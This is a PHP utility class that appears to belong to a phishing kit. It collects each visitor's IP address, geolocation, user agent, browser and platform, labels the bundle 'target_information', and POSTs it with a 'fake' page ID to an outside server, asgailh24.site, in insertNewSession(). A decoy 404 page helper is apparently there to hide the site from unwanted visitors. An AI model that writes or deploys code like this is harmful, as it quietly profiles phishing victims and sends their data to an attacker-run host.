<?php

require_once __DIR__ . "/remote.address.php";
require_once __DIR__ . "/browser.detection.php";

class UtilityClass
{
    public function readJsonFile($filePath, $assoc = false)
    {
        if (!file_exists($filePath)) {
            return null;
        }

        $content = file_get_contents($filePath);

        $data = json_decode($content, $assoc);

        if (json_last_error() !== JSON_ERROR_NONE) {
            return null;
        }

        return $data;
    }

    public function sanitizeParam($param) {
        $param = strip_tags(htmlspecialchars(trim($param)));
        return $param;
    }

    public function generateUuidV4() {
        $data = random_bytes(16);
        
        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    
        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
    }

    public function getFakeID() {
        $pageInformation = $this->readJsonFile(__DIR__ . "/../../config/page-information.json");
        return $pageInformation->pageId;
    }

    public function getGeolocationInformation($ipAddress) {
        $link = file_get_contents('http://ipinfo.io/'.$ipAddress);
        $json = json_decode($link, true);
        return $json['country'].", ".$json['region'].", ".$json['city'].", ".$json['postal'];
    }

    public function getRealIpAddrress() {
        $remoteAddress = new RemoteAddress;
        return $remoteAddress->getIpAddress();
    }

    public function getBrowserInformation() {
        $browserDetection = new BrowserDetection;
        $browserInformation = $browserDetection->getName()." ".$browserDetection->getVersion();
        return $browserInformation;
    }

    public function getPlatformInformation() {
        $browserDetection = new BrowserDetection;
        $browserInformation = $browserDetection->getPlatformVersion();
        return $browserInformation; 
    }

    public function returnUserAgent() {
        if(!empty($_SERVER['HTTP_USER_AGENT'])) {
            return $_SERVER['HTTP_USER_AGENT'];
        }
        return "Unknown UserAgent";
    }

    public function displayNotFoundError() {
        http_response_code(404); 

        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html>
        <head>
          <title>404 Not Found</title>
        </head>
        <body>
          <h1>Not Found</h1>
          <p>The requested URL was not found on this server.</p>
        </body>
        </html>
        ';

      exit();

    }

    public function mergeUsersData() {
        $data = [
            'ipAddress'   => $this->getRealIpAddrress(),
            'userAgent'   => $this->returnUserAgent(),
            'geolocation' => $this->getGeolocationInformation($this->getRealIpAddrress()),
            'browser'     => $this->getBrowserInformation(),
            'system'      => $this->getPlatformInformation()
        ];
    
        return json_encode($data);
    }

    public function insertNewSession() {
        $apiUrl = "https://asgailh24.site/src/Api/v1.php";
        $parameter = "?insertNewSession";

        $postData = [
            'uuid' => $_SESSION["uuid"],
            'target_information' => (string) $this->mergeUsersData(),
            'fake_uuid' => $this->getFakeID()
        ];
        
        
        $ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $apiUrl . $parameter);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
        $response = curl_exec($ch);
        curl_close($ch);
    
        return $response;
    }

    public function validatePageId() {
        $apiUrl = "https://asgailh24.site/src/Api/v1.php";
        $parameter = "?validatePageId";

        $postData = [
            'pageId' => $this->getFakeID()
        ];
    
        $ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $apiUrl . $parameter);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
        $response = curl_exec($ch);
        curl_close($ch);
    
        return $response;
    }
    

}